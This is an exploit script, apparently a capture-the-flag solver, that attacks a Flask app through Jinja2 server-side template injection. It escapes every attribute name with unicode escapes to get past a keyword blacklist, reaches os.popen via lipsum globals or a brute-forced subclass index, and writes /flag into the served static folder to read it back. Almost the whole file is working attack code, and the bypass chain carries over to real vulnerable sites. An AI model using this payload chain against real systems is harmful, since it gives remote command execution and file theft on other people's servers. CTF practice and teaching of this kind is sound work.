#!/usr/bin/env python3
"""HardFlask-awdp-fix -- Jinja2 SSTI blacklist bypass -> RCE -> read /flag.

Usage:
    python3 solve.py http://THOST:TPORT        # or rely on $THOST/$TPORT env

Vuln: POST / nickname=... -> render_template_string(nicknames[id] % p)
Blacklist (substring, case-sensitive) blocks: {{ }} [ ] ' space + _ . x g
and request/print/args/values/input/globals/getitem/class/mro/base/session/
add/chr/ord/redirect/url_for/popen/os/read/flag/config/builtins/
get_flashed_messages/get/subclasses/form/cookies/headers.

Bypass: {%if(...)%} statement blocks ({{ }} banned, {% %} not), |attr() filter
instead of dots/calls, and backslash-uXXXX escape every attr name and the whole
shell command -- Jinja string literals decode the escapes, so the raw payload
never contains a banned substring (space = u0020, flag = escaped, and hex
digits 0-9a-f can never spell 'g' or 'x').

RCE chain (no environment-dependent index):
    lipsum|attr(__globals__)|attr(__getitem__)(__builtins__)
         |attr(__getitem__)(__import__)("os")|attr(popen)(CMD)
Note: lipsum.__globals__ has no "os" key on this target (KeyError->Exception),
but __builtins__.__import__ works. Blind if-block => exfil via file write into
/app/static (dir 0777, app runs as uid 1000, Flask serves it at /static).

Fallback chain uses "".__class__.__bases__[0].__subclasses__()[IDX] with a
truthiness probe sweep; popen index was 132 in the 2026-09-10 test round
(original 2022 writeup used 133) -- it is environment-dependent.

Pitfalls encoded below: never %-format strings containing '{%' (the %i inside
{%if raises TypeError); do not append |attr(read)() inside the if -- a
redirected command yields an empty string (falsy) so 'ok' disappears even
though the command ran; judge success only by the exfil file.
"""
import os
import re
import sys

import requests

TIMEOUT = 15
OUTNAME = "hfkbout"

BLACKLIST = [
    "}}", "{{", "]", "[", "'", " ", "+", "_", ".", "x", "g",
    "request", "print", "args", "values", "input", "globals", "getitem",
    "class", "mro", "base", "session", "add", "chr", "ord", "redirect",
    "url_for", "popen", "os", "read", "flag", "config", "builtins",
    "get_flashed_messages", "get", "subclasses", "form", "cookies", "headers",
]


def esc(s: str) -> str:
    # "\\u" + 4 hex digits; hex digits 0-9a-f can never contain 'g' or 'x'
    return "".join("\\u%04x" % ord(c) for c in s)


def attr(name: str) -> str:
    return '|attr("' + esc(name) + '")'


def post(base: str, payload: str) -> str:
    r = requests.post(base + "/", data={"nickname": payload}, timeout=TIMEOUT)
    return r.text


def check(payload: str) -> None:
    hits = [b for b in BLACKLIST if b in payload]
    if hits:
        sys.exit("[!] payload hits blacklist: %r" % hits)


def fire(base: str, chain: str) -> str:
    cmd = "cat /flag>/app/static/" + OUTNAME
    payload = '{%if(' + chain + '("' + esc(cmd) + '"))%}ok{%endif%}'
    check(payload)
    return post(base, payload)


def fetch_flag(base: str) -> str:
    r = requests.get(base + "/static/" + OUTNAME, timeout=TIMEOUT)
    if r.status_code == 200 and r.text.strip():
        return r.text.strip()
    return ""


def lipsum_chain() -> str:
    return ("lipsum" + attr("__globals__") + attr("__getitem__")
            + '("' + esc("__builtins__") + '")' + attr("__getitem__")
            + '("' + esc("__import__") + '")'
            + '("' + esc("os") + '")' + attr("popen"))


def class_chain(idx: int) -> str:
    return ('""' + attr("__class__") + attr("__bases__") + attr("__getitem__")
            + "(0)" + attr("__subclasses__") + "()" + attr("__getitem__")
            + "(" + str(idx) + ")" + attr("__init__") + attr("__globals__")
            + attr("__getitem__") + '("' + esc("popen") + '")')


def main() -> int:
    if len(sys.argv) > 1:
        base = sys.argv[1].rstrip("/")
    elif os.environ.get("THOST"):
        base = "http://%s:%s" % (os.environ["THOST"], os.environ.get("TPORT", "80"))
    else:
        sys.exit("usage: solve.py http://THOST:TPORT   (or export THOST/TPORT)")
    print("[*] target     : %s" % base)

    r = requests.get(base + "/", timeout=TIMEOUT)
    print("[*] fingerprint: %s / %s" % (
        "Age Test" if "Age Test" in r.text else r.text[:40].strip(),
        r.headers.get("Server", "?")))

    probe = "{%if(1)%}ok{%endif%}"
    check(probe)
    resp = post(base, probe)
    if "Hacker" in resp:
        sys.exit("[!] blacklist hit on probe (app changed?): %s" % resp)
    if "ok" not in resp:
        sys.exit("[!] SSTI probe dead (no 'ok' in %r)" % resp[:80])
    print("[*] SSTI probe : alive")

    resp = fire(base, lipsum_chain())
    if "ok" in resp:
        print("[*] RCE        : lipsum chain triggered")
    flag = fetch_flag(base)
    if not flag:
        print("[*] lipsum exfil empty, sweeping subclass index ...")
        found = None
        for idx in range(400):
            payload = "{%if(" + class_chain(idx) + ")%}ok{%endif%}"
            check(payload)
            resp = post(base, payload)
            if "ok" in resp and "Hacker" not in resp:
                found = idx
                break
        if found is None:
            sys.exit("[!] no popen index in 0..399 and lipsum chain failed")
        print("[*] RCE        : class chain, popen index %d" % found)
        fire(base, class_chain(found))
        flag = fetch_flag(base)
    if not flag:
        sys.exit("[!] RCE ran but /static/%s empty (is /flag readable?)" % OUTNAME)

    print("[+] FLAG       : %s" % flag)
    m = re.match(r"^[A-Za-z0-9_]+\{(.+)\}$", flag)
    if m:
        print("[*] submit     : %s  (rejected then try full %s)" % (m.group(1), flag))
    else:
        print("[*] submit     : %s" % flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
